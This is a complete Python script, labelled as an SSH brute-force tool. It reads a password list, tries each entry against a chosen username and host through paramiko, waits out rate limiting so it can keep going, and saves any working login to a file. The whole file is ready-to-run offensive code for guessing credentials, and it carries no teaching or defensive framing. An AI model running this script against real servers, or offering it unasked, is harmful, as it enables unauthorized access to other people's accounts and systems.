#!/usr/bin/env python3
import paramiko
import socket
import time
import argparse
from colorama import init, Fore

# Initialize colorama for colored output
init()
GREEN = Fore.GREEN
RED = Fore.RED
RESET = Fore.RESET
BLUE = Fore.BLUE

def is_ssh_open(hostname, username, password):
    # Initialize SSH client
    client = paramiko.SSHClient()
    # Automatically add the hostname and new host key to the local host keys
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    try:
        # Attempt connection with a 3-second timeout
        client.connect(hostname=hostname, username=username, password=password, timeout=5)
    except socket.timeout:
        print(f"{RED}[!] Host: {hostname} is unreachable, timed out.{RESET}")
        return False
    except paramiko.AuthenticationException:
        print(f"[!] Invalid credentials for {username}:{password}")
        return False
    except paramiko.SSHException:
        print(f"{BLUE}[*] Quota exceeded, retrying with delay...{RESET}")
        # Sleep for a minute to bypass rate limiting
        time.sleep(60)
        return is_ssh_open(hostname, username, password)
    else:
        # Connection established successfully
        print(f"{GREEN}[+] Found combo:\n\tHOSTNAME: {hostname}\n\tUSERNAME: {username}\n\tPASSWORD: {password}{RESET}")
        return True
    finally:
        client.close()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="SSH Bruteforce Python script.")
    parser.add_argument("host", help="Hostname or IP Address of SSH Server to bruteforce.")
    parser.add_argument("-P", "--passlist", help="File that contains password list in each line.")
    parser.add_argument("-u", "--user", help="Host username.")

    args = parser.parse_args()
    host = args.host
    passlist = args.passlist
    user = args.user

    # Read the password list
    with open(passlist, 'r', encoding='latin-1', errors='ignore') as f:
        passlist = f.read().splitlines()

    # Iterate over passwords
    for password in passlist:
        if is_ssh_open(host, user, password):
            with open("credentials.txt", "w") as f:
                f.write(f"{user}@{host}:{password}")
            break